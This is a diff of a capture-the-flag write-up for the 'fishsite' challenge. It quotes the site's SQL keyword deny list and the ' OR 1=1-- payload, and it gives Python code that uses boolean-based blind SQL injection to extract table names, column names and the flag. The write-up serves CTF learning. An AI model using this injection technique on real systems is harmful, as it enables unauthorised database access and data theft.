@@ -117,16 +117,20 @@ Then, we're presented with an "administration pane:"
 We can see in ``fishsite.py`` that there is a list of disallowed words that we cannot use in our SQL injection:
 ``DISALLOWED_WORDS = ["insert", "create", "alter", "drop", "delete", "backup", "transaction", "commit", "rollback", "replace", "update", "pragma", "attach", "load", "vacuum"]``
 
-Notably, this list does not disallow "SELECT." This means we can binary search for table/column names.
-In this case, the flag was in... "flag."
+Notably, this list does not disallow "SELECT."
 
-We can again utilize binary search to recover the full flag.
+Remember this input from earlier that gave us access to the administration pane?
+``' OR 1=1--``
 
-Solve code: (this is after binary searching for table names and finding "flag")
+We can use this kind of query for binary search by just replacing 1=1 with a boolean we want to check.
+
+In this case, we can binary search for characters in the list of tables, then the list of columns.
+
+Recon code:
 ```
 import requests
 
-url = "https://fishsite-a32d72b4635a88d5.challenges.2025.vuwctf.com"  # replace with your url
+url = "https://fishsite-a32d72b4635a88d5.challenges.2025.vuwctf.com/"  # replace with your instance url
 
 def check(condition):
     payload = f"' OR ({condition})--"
@@ -150,9 +154,25 @@ def extract_string(query):
         print(f"{result}")
     return result
 
-print("extracting from flag table...")
+
+tables = extract_string("SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' LIMIT 1")
+print(f"\nTables: {tables}\n")
+
+columns = extract_string(f"SELECT group_concat(name, ',') FROM pragma_table_info('{tables}')")
+print(f"\nColumns in {tables}: {columns}\n")
+```
+
+After running this (and a lot of waiting for the searches to resolve) we get one table ``fish`` with columns ``id, username, password``.
+
+...No obvious flag there.
+
+Well, since it's a blind SQLi challenge, we can always try something obvious now that we've found the vulnerability:
+
+```
 flag = extract_string("SELECT * FROM flag LIMIT 1")
 print(f"\nResult: {flag}\n")
 ```
 
-After lots and lots of waiting for the full search to run, the flag was ``VuwCTF{h3art_0v_p3ar1}``. Nice!
+<del>ohwaitit'sactuallyworking</del> I'll be darned, it actually worked.
+
+After lots of waiting, the flag ```VuwCTF{h3art_0v_p3ar1}``` popped up in the output! Nice!
